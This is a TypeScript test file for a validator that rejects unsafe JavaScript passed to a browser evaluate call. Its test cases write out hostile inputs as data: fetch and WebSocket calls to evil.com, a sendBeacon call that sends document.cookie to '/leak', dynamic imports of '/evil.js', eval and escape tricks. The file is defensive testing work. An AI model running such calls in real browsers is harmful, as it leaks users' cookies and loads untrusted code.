import { describe, expect, it } from "vitest";
import { assertSafeEvaluateCode, UnsafeEvaluateCodeError } from "./pw-evaluate-validation.js";

function expectBlocked(code: string, pattern: string) {
  try {
    assertSafeEvaluateCode(code);
    throw new Error(`expected block for pattern: ${pattern}`);
  } catch (err) {
    expect(err).toBeInstanceOf(UnsafeEvaluateCodeError);
    expect((err as UnsafeEvaluateCodeError).pattern).toBe(pattern);
  }
}

describe("assertSafeEvaluateCode", () => {
  it("allows simple expression functions", () => {
    expect(() => assertSafeEvaluateCode("() => 1 + 1")).not.toThrow();
  });

  it("allows blocked tokens inside comments and string literals", () => {
    const fn = `
      () => {
        // fetch("https://example.com")
        const text = "eval(fetch())";
        return text;
      }
    `;
    expect(() => assertSafeEvaluateCode(fn)).not.toThrow();
  });

  it.each([
    ['") => 1', "leading-quote-or-close-paren"],
    ["'() => 1", "leading-quote-or-close-paren"],
    [") => 1", "leading-quote-or-close-paren"],
    ["() => fetch('https://evil.com')", "fetch"],
    ["() => new XMLHttpRequest()", "XMLHttpRequest"],
    ["() => new WebSocket('wss://evil.com')", "WebSocket"],
    ["() => navigator.sendBeacon('/leak', document.cookie)", "sendBeacon"],
    ["() => navigator['sendBeacon']('/leak')", "navigator[sendBeacon]"],
    ["() => eval('alert(1)')", "direct-eval"],
    ["() => new Function('return 1')()", "new Function"],
    ["() => import('/evil.js')", "dynamic-import"],
    ["() => importScripts('/evil.js')", "importScripts"],
    ["() => '\\u0065'", "unicode-escape"],
    ["() => '\\x65'", "hex-escape"],
    ["() => `value`", "template-literal"],
  ])("blocks unsafe pattern %s", (code, pattern) => {
    expectBlocked(code, pattern);
  });

  it("blocks null bytes", () => {
    expectBlocked("() => 'a\0b'", "null-byte");
  });

  it("blocks excessively long function strings", () => {
    const code = `() => "${"a".repeat(9000)}"`;
    expectBlocked(code, "max-length-exceeded");
  });
});
